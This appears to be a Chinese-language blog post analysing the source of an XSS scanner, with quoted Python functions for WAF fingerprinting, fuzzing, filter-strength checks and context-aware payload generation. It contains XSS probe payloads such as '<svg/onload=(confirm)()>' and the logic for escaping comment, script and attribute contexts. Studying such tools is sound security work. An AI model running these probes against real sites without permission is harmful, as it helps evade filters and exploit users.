<h2 id="WAF-detector-WAF检测"><a href="#WAF-detector-WAF检测" class="headerlink" title="WAF_detector() - WAF检测"></a>WAF_detector() - WAF检测</h2><p>WAF_detector() 定义在第171行，它通过发起请求，然后根据页面的response code来确定是否存在waf。源码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">WAF_detector</span><span class="params">(url, param_data, GET, POST)</span>:</span></div><div class="line">    <span class="keyword">global</span> WAF</div><div class="line">    WAF = <span class="keyword">False</span></div><div class="line">    noise = quote_plus(<span class="string">'&lt;script&gt;confirm()&lt;/script&gt;'</span>) <span class="comment">#a payload which is noisy enough to provoke the WAF</span></div><div class="line">    fuzz = param_data.replace(xsschecker, noise) <span class="comment">#Replaces xsschecker in param_data with noise</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        sleep(delay) <span class="comment"># Pausing the program. Default = 0 sec. In case of WAF = 6 sec.</span></div><div class="line">        <span class="keyword">if</span> GET:</div><div class="line">            response = br.open(url + fuzz) <span class="comment"># Opens the noise injected payload</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            response = br.open(url, fuzz) <span class="comment"># Opens the noise injected payload</span></div><div class="line">        <span class="keyword">print</span> <span class="string">'%s WAF Status: Offline'</span> % good</div><div class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e: <span class="comment"># if an error occurs, catch the error</span></div><div class="line">        e = str(e) <span class="comment"># convert the error to a string</span></div><div class="line">        <span class="comment"># Here, we are looking for HTTP response codes in the error to fingerprint the WAF</span></div><div class="line">        <span class="keyword">if</span> <span class="string">'406'</span> <span class="keyword">in</span> e <span class="keyword">or</span> <span class="string">'501'</span> <span class="keyword">in</span> e: <span class="comment"># if the http response code is 406/501</span></div><div class="line">            WAF_Name = <span class="string">'Mod_Security'</span></div><div class="line">            WAF = <span class="keyword">True</span></div><div class="line">        <span class="keyword">elif</span> <span class="string">'999'</span> <span class="keyword">in</span> e: <span class="comment"># if the http response code is 999</span></div><div class="line">            WAF_Name = <span class="string">'WebKnight'</span></div><div class="line">            WAF = <span class="keyword">True</span></div><div class="line">        <span class="keyword">elif</span> <span class="string">'419'</span> <span class="keyword">in</span> e: <span class="comment"># if the http response code is 419</span></div><div class="line">            WAF_Name = <span class="string">'F5 BIG IP'</span></div><div class="line">            WAF = <span class="keyword">True</span></div><div class="line">        <span class="keyword">elif</span> <span class="string">'403'</span> <span class="keyword">in</span> e: <span class="comment"># if the http response code is 403</span></div><div class="line">            WAF_Name = <span class="string">'Unknown'</span></div><div class="line">            WAF = <span class="keyword">True</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">print</span> <span class="string">'%s WAF Status: Offline'</span> % good</div><div class="line">        <span class="keyword">if</span> WAF:</div><div class="line">            <span class="keyword">print</span> <span class="string">'%s WAF Detected: %s'</span> % (bad, WAF_Name)</div></pre></td></tr></table></figure></p>
<p>该函数在第652行，<code>initiator()</code>中调用：<code>WAF_detector(url, &#39;?&#39;+paranames[0]+&#39;=&#39;+xsschecker, GET, POST)</code>。</p>
<p>该函数将无害的xsschecker替换为最常见的payload<code>&lt;script&gt;confirm()&lt;/script&gt;</code>，因此当存在waf时，基本能触发waf，从而检测得到。之后根据下表进行了对waf的指纹检索：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">status_code</th>
<th style="text-align:center">WAF name</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">406或501</td>
<td style="text-align:center">Mod_Security</td>
</tr>
<tr>
<td style="text-align:center">999</td>
<td style="text-align:center">WebKnight</td>
</tr>
<tr>
<td style="text-align:center">419</td>
<td style="text-align:center">F5 BIG IP</td>
</tr>
<tr>
<td style="text-align:center">403</td>
<td style="text-align:center">Unknown</td>
</tr>
</tbody>
</table>
</div>
<h2 id="fuzzer-对WAF的fuzz"><a href="#fuzzer-对WAF的fuzz" class="headerlink" title="fuzzer() - 对WAF的fuzz"></a>fuzzer() - 对WAF的fuzz</h2><p>fuzzer()定义在 134 行，源码如下:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuzzer</span><span class="params">(url, param_data, GET, POST)</span>:</span></div><div class="line">    result = [] <span class="comment"># Result of fuzzing</span></div><div class="line">    progress = <span class="number">0</span> <span class="comment"># Variable for recording the progress of fuzzing</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> fuzzes:</div><div class="line">        progress = progress + <span class="number">1</span></div><div class="line">        sleep(delay) <span class="comment"># Pausing the program. Default = 0 sec. In case of WAF = 6 sec. # Pausing the program. Default = 0 sec. In case of WAF = 6 sec.</span></div><div class="line">        sys.stdout.write(<span class="string">'\r%s Fuzz Sent: %i/%i'</span> % (run, progress, len(fuzzes)))</div><div class="line">        sys.stdout.flush()</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            fuzzy = quote_plus(i) <span class="comment"># URL encoding the payload</span></div><div class="line">            param_data_injected = param_data.replace(xsschecker, fuzzy) <span class="comment"># Replcaing the xsschecker with fuzz</span></div><div class="line">            <span class="keyword">if</span> GET: <span class="comment"># GET parameter</span></div><div class="line">                response = br.open(url + param_data_injected).read() <span class="comment"># makes a request to example.com/search.php?q=&lt;fuzz&gt;</span></div><div class="line">            <span class="keyword">else</span>: <span class="comment"># POST parameter</span></div><div class="line">                response = br.open(url, param_data_injected).read() <span class="comment"># Seperating the "param_data_injected" with comma because its POST data</span></div><div class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> response: <span class="comment"># if fuzz string is reflected in the response / source code</span></div><div class="line">                result.append(&#123;</div><div class="line">                <span class="string">'result'</span> : <span class="string">'%sWorks%s'</span> % (green, end),</div><div class="line">                <span class="string">'fuzz'</span> : i&#125;)</div><div class="line">            <span class="keyword">else</span>: <span class="comment"># if the fuzz string was not reflected in the response completely</span></div><div class="line">                result.append(&#123;</div><div class="line">                    <span class="string">'result'</span> : <span class="string">'%sFiltered%s'</span> % (yellow, end),</div><div class="line">                    <span class="string">'fuzz'</span> : i&#125;)</div><div class="line">        <span class="keyword">except</span>: <span class="comment"># if the server returned an error (Maybe WAF blocked it)</span></div><div class="line">            result.append(&#123;</div><div class="line">                <span class="string">'result'</span> : <span class="string">'%sBlocked%s'</span>  % (red, end),</div><div class="line">                <span class="string">'fuzz'</span> : i&#125;)</div><div class="line">    table = PrettyTable([<span class="string">'Fuzz'</span>, <span class="string">'Response'</span>]) <span class="comment"># Creates a table with two columns</span></div><div class="line">    <span class="keyword">for</span> value <span class="keyword">in</span> result:</div><div class="line">        table.add_row([value[<span class="string">'fuzz'</span>], value[<span class="string">'result'</span>]]) <span class="comment"># Adds the value of fuzz and result to the columns</span></div><div class="line">    <span class="keyword">print</span> <span class="string">'\n'</span>, table</div></pre></td></tr></table></figure></p>
<p>fuzzes在程序初始化部分已经定义<code>fuzzes = [&#39;&lt;z oNxXx=yyy&gt;&#39;, &#39;&lt;z xXx=yyy&gt;&#39;.......]</code>。fuzzer中遍历fuzzes，通过对当前测试参数替换不同的payload，观察返回的html页面，若payload在页面中被匹配到则为<code>Works</code>，否则即失败<code>Filtered</code>或<code>Blocked</code>。之后用PrettyTable输出fuzz的结果。</p>
<h2 id="filter-checker-过滤检查"><a href="#filter-checker-过滤检查" class="headerlink" title="filter_checker() - 过滤检查"></a>filter_checker() - 过滤检查</h2><p>filter_checker()定义在 207 行：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">filter_checker</span><span class="params">(url, param_data, GET, POST)</span>:</span></div><div class="line">    strength = <span class="string">''</span> <span class="comment"># A variable for containing strength of the filter</span></div><div class="line">    <span class="comment"># Injecting a malicious payload first by replacing xsschecker with our payload</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        low_string = param_data.replace(xsschecker, quote_plus(<span class="string">'&lt;svg/onload=(confirm)()&gt;'</span>))</div><div class="line">        sleep(delay) <span class="comment"># Pausing the program. Default = 0 sec. In case of WAF = 6 sec.</span></div><div class="line">        <span class="keyword">if</span> GET:</div><div class="line">            low_request = br.open(url + low_string).read()</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            low_request = br.open(url, low_string).read()</div><div class="line">        <span class="keyword">if</span> <span class="string">'&lt;svg/onload=(confirm)()&gt;'</span> <span class="keyword">in</span> low_request: ...</div><div class="line">        <span class="keyword">else</span>: ...</div><div class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            <span class="keyword">print</span> <span class="string">'%s Target doesn\'t seem to respond properly. Error Code: %s'</span> % (bad, re.search(<span class="string">r'\d\d\d'</span>, str(e)).group())</div><div class="line">        <span class="keyword">except</span>:</div><div class="line">            <span class="keyword">print</span> <span class="string">'%s Target doesn\'t seem to respond properly.'</span> % bad</div></pre></td></tr></table></figure></p>
<p>这里直接使用<code>&lt;svg/onload=(confirm)()&gt;</code>来进行过滤检查。变量strength用于表明过滤的强度。之后根据页面返回的html进行深入检查。</p>
<p>如果没有过滤，也即返回的html中直接包含了<code>&lt;svg/onload=(confirm)()&gt;</code>，则直接确定过滤强度为Low or None。并且<code>&lt;svg/onload=(confirm)()&gt;</code>即可作为payload，根据选择是要进一步的处理，还是直接根据这个payload打开相应的xss页面。下面是对应的代码。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> <span class="string">'&lt;svg/onload=(confirm)()&gt;'</span> <span class="keyword">in</span> low_request: <span class="comment"># If payload was reflected in response</span></div><div class="line">    <span class="keyword">print</span> <span class="string">"%s Filter Strength : %sLow or None%s"</span> % (good, green, end)</div><div class="line">    <span class="keyword">print</span> <span class="string">'%s Payload: &lt;svg/onload=(confirm)()&gt;'</span> % good</div><div class="line">    <span class="keyword">print</span> <span class="string">'%s Efficiency: 100%%'</span> % good</div><div class="line">    choice = raw_input(<span class="string">'%s A payload with 100%% efficiency was found. Continue scanning? [y/N] '</span> % que).lower()</div><div class="line">    <span class="keyword">if</span> choice == <span class="string">'y'</span>:</div><div class="line">        <span class="keyword">pass</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">if</span> GET:</div><div class="line">            webbrowser.open(url+param_data.strip(xsschecker)+<span class="string">'&lt;svg/onload=(confirm)()&gt;'</span>)</div><div class="line">            quit()</div><div class="line">    strength = <span class="string">'low'</span> <span class="comment"># As a malicious payload was not filtered, the filter is weak</span></div></pre></td></tr></table></figure></p>
<p>倘若存在过滤，也即返回的页面中找不到<code>&lt;svg/onload=(confirm)()&gt;</code>，可能直接整个去掉了，可能过滤了某些关键字，或者可能转义了敏感字符。则会更换测试的payload，比如<code>&lt;zz//onxx=yy&gt;</code>，然后发起请。根据响应html，如果<code>&lt;zz//onxx=yy&gt;</code>在html中，则过滤程度为medium，如果不在html，则过滤程度为high。相关代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">else</span>: <span class="comment"># If malicious payload was filtered (was not in the response)</span></div><div class="line">    <span class="comment"># Now we will use a less malicious payload</span></div><div class="line">    medium_string = param_data.replace(xsschecker, quote_plus(<span class="string">'&lt;zz//onxx=yy&gt;'</span>))</div><div class="line">    sleep(delay) <span class="comment"># Pausing the program. Default = 0 sec. In case of WAF = 6 sec.</span></div><div class="line">    <span class="keyword">if</span> GET:</div><div class="line">        medium_request = br.open(url + medium_string).read()</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        medium_request = br.open(url + medium_string).read()</div><div class="line">    <span class="keyword">if</span> <span class="string">'&lt;zz onxx=yy&gt;'</span> <span class="keyword">in</span> medium_request:</div><div class="line">        <span class="keyword">print</span> <span class="string">'%s Filter Strength : %sMedium%s'</span> % (info, yellow, end)</div><div class="line">        strength = <span class="string">'medium'</span></div><div class="line">    <span class="keyword">else</span>: <span class="comment">#Printing high since result was not medium/low</span></div><div class="line">        <span class="keyword">print</span> <span class="string">'%s Filter Strength : %sHigh%s'</span> % (bad, red, end)</div><div class="line">        strength = <span class="string">'high'</span></div><div class="line">    <span class="keyword">return</span> strength</div></pre></td></tr></table></figure></p>
<h2 id="locater-定位输出点"><a href="#locater-定位输出点" class="headerlink" title="locater() - 定位输出点"></a>locater() - 定位输出点</h2><p>locater() 定义在第 254 行：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">locater</span><span class="params">(url, param_data, GET, POST)</span>:</span></div><div class="line">    init_resp = make_request(url, param_data, GET, POST) <span class="comment"># Makes request to the target</span></div><div class="line">    <span class="keyword">if</span>(xsschecker <span class="keyword">in</span> init_resp.lower()): <span class="comment"># if the xsschecker is found in the response</span></div><div class="line">        <span class="keyword">global</span> NUM_REFLECTIONS <span class="comment"># The number of reflections of xsschecker in the response</span></div><div class="line">        NUM_REFLECTIONS = init_resp.lower().count(xsschecker.lower()) <span class="comment"># Counts number of time d3v got reflected in webpage</span></div><div class="line">        <span class="keyword">print</span> <span class="string">'%s Number of reflections found: %i'</span> % (info, NUM_REFLECTIONS)</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(NUM_REFLECTIONS):</div><div class="line">            <span class="keyword">global</span> OCCURENCE_NUM</div><div class="line">            OCCURENCE_NUM = i+<span class="number">1</span></div><div class="line">            scan_occurence(init_resp) <span class="comment"># Calls out a function to find context/location of xsschecker </span></div><div class="line">            <span class="comment"># Reset globals for next instance</span></div><div class="line">            <span class="keyword">global</span> ALLOWED_CHARS, IN_SINGLE_QUOTES, IN_DOUBLE_QUOTES, IN_TAG_ATTRIBUTE, IN_TAG_NON_ATTRIBUTE, IN_SCRIPT_TAG, CURRENTLY_OPEN_TAGS, OPEN_TAGS, OCCURENCE_PARSED, OPEN_EMPTY_TAG</div><div class="line">            ALLOWED_CHARS, CURRENTLY_OPEN_TAGS, OPEN_TAGS = [], [], []</div><div class="line">            IN_SINGLE_QUOTES, IN_DOUBLE_QUOTES, IN_TAG_ATTRIBUTE, IN_TAG_NON_ATTRIBUTE, IN_SCRIPT_TAG = <span class="keyword">False</span>, <span class="keyword">False</span>, <span class="keyword">False</span>, <span class="keyword">False</span>, <span class="keyword">False</span></div><div class="line">            OCCURENCE_PARSED = <span class="number">0</span></div><div class="line">            OPEN_EMPTY_TAG = <span class="string">""</span></div><div class="line">    <span class="keyword">else</span>: <span class="comment">#Launched hulk if no reflection is found. Hulk Smash!</span></div><div class="line">        <span class="keyword">print</span> <span class="string">'%s No reflection found.'</span> % bad</div></pre></td></tr></table></figure></p>
<p>这里定位输出点，通过xsschecker的值为d3v，可以检测在html中该值出现了几次，保存为NUM_REFLECTIONS。同时用变量OCCURENCE_NUM来定位每次的输出点，然后通过对每一处进行<code>scan_occurence()</code>，该函数定义在 273 行，代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan_occurence</span><span class="params">(init_resp)</span>:</span></div><div class="line">    <span class="comment"># Parses the response to locate the position/context of xsschecker i.e. d3v</span></div><div class="line">    location = html_parse(init_resp) <span class="comment"># Calling out the parser function</span></div><div class="line">    <span class="keyword">if</span> location <span class="keyword">in</span> (<span class="string">'script'</span>, <span class="string">'html_data'</span>, <span class="string">'start_end_tag_attr'</span>, <span class="string">'attr'</span>):</div><div class="line">        occur_number.append(OCCURENCE_NUM)</div><div class="line">        occur_location.append(location)</div><div class="line">    <span class="comment"># We are treating the comment context differentally because if a payload is reflected</span></div><div class="line">    <span class="comment"># in comment, it won't execute. So will we test the comment context first</span></div><div class="line">    <span class="keyword">elif</span> location == <span class="string">'comment'</span>:</div><div class="line">        occur_number.insert(<span class="number">0</span>, OCCURENCE_NUM) <span class="comment"># inserting the occurence_num in start of the list</span></div><div class="line">        occur_location.insert(<span class="number">0</span>, location) <span class="comment"># same as above</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">pass</span></div></pre></td></tr></table></figure>
<p><code>html_parse(init_resp)</code>是作者自己实现的html解析函数，通过OCCURENCE_NUM可以定位到具体的输出点，然后确定输出点所在的位置。作者在注释中提到，如果输出点在注释中，则直接成为<code>occur_number</code>和<code>occur_location</code>的首元素，因为通常情况下处于注释中的代码时不会执行的。在其他情况下（script/html_data/start_end_tag_attr/attr），按顺序对应添加进入<code>occur_number</code>和<code>occur_location</code>。<code>occur_number</code>是输出点的标号，<code>occur_location</code>是输出点的位置。</p>
<h2 id="inject-payload注入"><a href="#inject-payload注入" class="headerlink" title="inject() - payload注入"></a>inject() - payload注入</h2><p>inject() 定义在 第 468 行，这部分是进行xss攻击的核心部分，代码较长，整体的框架如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">inject</span><span class="params">(url, param_data, GET, POST)</span>:</span></div><div class="line">    special = <span class="string">''</span></div><div class="line">    l_filling = <span class="string">''</span></div><div class="line">    e_fillings = [<span class="string">'%0a'</span>,<span class="string">'%09'</span>,<span class="string">'%0d'</span>,<span class="string">'+'</span>] <span class="comment"># "Things" to use between event handler and = or between function and =</span></div><div class="line">    fillings = [<span class="string">'%0c'</span>, <span class="string">'%0a'</span>,<span class="string">'%09'</span>,<span class="string">'%0d'</span>,<span class="string">'/+/'</span>] <span class="comment"># "Things" to use instead of space</span></div><div class="line">    </div><div class="line">    <span class="keyword">for</span> OCCURENCE_NUM, location <span class="keyword">in</span> izip(occur_number, occur_location):</div><div class="line">        <span class="keyword">print</span> <span class="string">'\n%s Testing reflection no. %s '</span> % (run, OCCURENCE_NUM)</div><div class="line">        allowed = []</div><div class="line"></div><div class="line">        <span class="keyword">if</span> test_param_check(<span class="string">'k"k'</span>, <span class="string">'k"k'</span>, OCCURENCE_NUM, url, param_data, GET, POST, action=<span class="string">'nope'</span>): </div><div class="line">            ...</div><div class="line">        <span class="keyword">elif</span> test_param_check(<span class="string">'k"k'</span>, <span class="string">'k&amp;quot;k'</span>, OCCURENCE_NUM, url, param_data, GET, POST, action=<span class="string">'nope'</span>):</div><div class="line">            ...</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            ...</div><div class="line">        <span class="keyword">if</span> test_param_check(<span class="string">'k\'k'</span>, <span class="string">'k\'k'</span>, OCCURENCE_NUM, url, param_data, GET, POST, action=<span class="string">'nope'</span>):</div><div class="line">            ...</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            ...</div><div class="line">        <span class="keyword">if</span> test_param_check(<span class="string">'&lt;lol&gt;'</span>, <span class="string">'&lt;lol&gt;'</span>, OCCURENCE_NUM, url, param_data, GET, POST, action=<span class="string">'nope'</span>):</div><div class="line">            ...</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            ... </div><div class="line"></div><div class="line"></div><div class="line">        <span class="keyword">if</span> location == <span class="string">'comment'</span>:</div><div class="line">            ...</div><div class="line">        <span class="keyword">elif</span> location == <span class="string">'script'</span>:</div><div class="line">            ...</div><div class="line">        <span class="keyword">elif</span> location == <span class="string">'html_data'</span>:</div><div class="line">            ...</div><div class="line">        <span class="keyword">elif</span> location == <span class="string">'start_end_tag_attr'</span> <span class="keyword">or</span> location == <span class="string">'attr'</span>:</div><div class="line">            ...</div></pre></td></tr></table></figure></p>
<p>首先会先定义四个变量<code>special</code>、<code>l_filling</code>、<code>e_fillings</code>、<code>fillings</code>，这些保存着后续payload生成的一些关键字符。接着通过对<code>occur_number</code>,<code>occur_location</code>的遍历，对每一个测试点进行测试。</p>
<p>测试主要分为两部分。</p>
<p>在第一部分的测试中，主要通过<code>test_param_check()</code>来进行特殊字符的检测，查看是否进行了编码：</p>
<ul>
<li>双引号(<code>&#39;</code>) </li>
<li>单引号(<code>&quot;</code>)</li>
<li>尖括号(<code>&lt;&gt;</code>)<br>关于<code>test_param_check()</code>如何具体工作，见后文</li>
</ul>
<p>在第二部分的测试中，根据当前测试点所在位置的不同进行不同的测试。</p>
<p>当输出点在注释（comment）中时：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> location == <span class="string">'comment'</span>:</div><div class="line">    <span class="keyword">print</span> <span class="string">'%s Trying to break out of %sHTML Comment%s context.'</span> % (run, green, end)</div><div class="line">    prefix = <span class="string">'--&gt;'</span></div><div class="line">    suffixes = [<span class="string">''</span>, <span class="string">'&lt;!--'</span>]</div><div class="line">    progress = <span class="number">1</span></div><div class="line">    <span class="keyword">for</span> suffix <span class="keyword">in</span> suffixes:</div><div class="line">        <span class="keyword">for</span> tag <span class="keyword">in</span> tags:</div><div class="line">            <span class="keyword">for</span> event_handler, compatible <span class="keyword">in</span> event_handlers.items():</div><div class="line">                <span class="keyword">if</span> tag <span class="keyword">in</span> compatible:</div><div class="line">                    <span class="keyword">for</span> filling, function, e_filling <span class="keyword">in</span> izip(fillings, functions, e_fillings):</div><div class="line">                        progress = progress + <span class="number">1</span></div><div class="line">                        sys.stdout.write(<span class="string">'\r%s Payloads tried: %i'</span> % (run, progress))</div><div class="line">                        sys.stdout.flush()</div><div class="line">                        <span class="keyword">if</span> event_handler == <span class="string">'oNeRror'</span>:</div><div class="line">                            payload = <span class="string">'%s&lt;%s%s%s%s%s%s%s%s=%s%s%s&gt;%s'</span> % (prefix, tag, filling, <span class="string">'sRc='</span>, e_filling, <span class="string">'='</span>, e_filling, event_handler, e_filling, e_filling, function, l_filling, suffix)</div><div class="line">                        <span class="keyword">else</span>:</div><div class="line">                            payload = <span class="string">'%s&lt;%s%s%s%s%s=%s%s%s&gt;%s'</span> % (prefix, tag, filling, special, event_handler, e_filling, e_filling, function, l_filling, suffix)</div><div class="line">                        test_param_check(quote_plus(payload), payload, OCCURENCE_NUM, url, param_data, GET, POST, action=<span class="string">'do'</span>)</div></pre></td></tr></table></figure></p>
<p>为了闭合注释，则payload的前缀必然是<code>--&gt;</code>，而对于后缀可以是空，或者选择闭合<code>&lt;!--</code>。接着选取前面定义的各种payload组成元素，构成payload，进行<code>test_param_check()</code>测试</p>
<p>当输出点在<code>script</code>标签中时，同样确定了可能的前缀和后缀，然后在生成payload，最后进行<code>test_param_check()</code>测试</p>
<p>当输出点在<code>html_data</code>中时，比如<code>&lt;h1&gt;输出点&lt;/h1&gt;</code>为了能让js解析payload而不仅仅只是文本，通常需要有尖括号，比如<code>&lt;h1&gt;&lt;script&gt;alert(1)&lt;/h1&gt;</code>、<code>&lt;h1&gt;&lt;svg/onload=(confirm)()&gt;&lt;h1&gt;</code>，因此当检测到尖括号被过滤掉时，会直接跳过此次测试:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> angular_allowed:</div><div class="line">    l_than, g_than = <span class="string">'&lt;'</span>, <span class="string">'&gt;'</span></div><div class="line"><span class="comment"># elif entity_allowed:</span></div><div class="line"><span class="comment">#     l_than, g_than = '&amp;lt;', '&amp;gt;'</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">    <span class="keyword">print</span> <span class="string">'%s Angular brackets are being filtered. Unable to generate payloads.'</span> % bad</div><div class="line">    <span class="keyword">continue</span></div></pre></td></tr></table></figure></p>
<p>倘若没有过滤，则生成payload，并进行<code>test_param_check()</code>测试。</p>
<p>当输出点在属性中时，比如<code>&lt;img src=输出点&gt;</code>或者<code>&lt;img src=&quot;输出点&quot;&gt;</code>或者<code>&lt;img src=&#39;输出点&#39;&gt;</code>，首先要考虑的时引号的闭合问题，因此会先提取出需要闭合的是单引号还是双引号还是不需要引号，然后生成payload进行<code>test_param_check()</code>测试:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">elif</span> location == <span class="string">'start_end_tag_attr'</span> <span class="keyword">or</span> location == <span class="string">'attr'</span>:</div><div class="line">    <span class="keyword">print</span> <span class="string">'%s Trying to break out of %sAttribute%s context.'</span> % (run, green, end)</div><div class="line">    quote = which_quote(OCCURENCE_NUM, url, param_data, GET, POST)</div><div class="line">    </div><div class="line">    <span class="keyword">if</span> quote == <span class="string">''</span>:</div><div class="line">        prefix = <span class="string">'/&gt;'</span></div><div class="line">        suffixes = [<span class="string">'&lt;"'</span>, <span class="string">'&lt;\''</span>, <span class="string">'&lt;br attr\'='</span>, <span class="string">'&lt;br attr="'</span>]</div><div class="line">    <span class="keyword">elif</span> quote <span class="keyword">in</span> allowed:</div><div class="line">        允许引号，生成payload，进行测试。</div><div class="line">    <span class="keyword">elif</span> quote <span class="keyword">not</span> <span class="keyword">in</span> allowed <span class="keyword">and</span> <span class="string">'entity'</span> <span class="keyword">in</span> allowed:</div><div class="line">        注 此部分被作者注释掉。暂且跳过不分析。</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">'%s Quotes are being filtered, its not possible to break out of the context.'</span> % bad</div></pre></td></tr></table></figure></p>
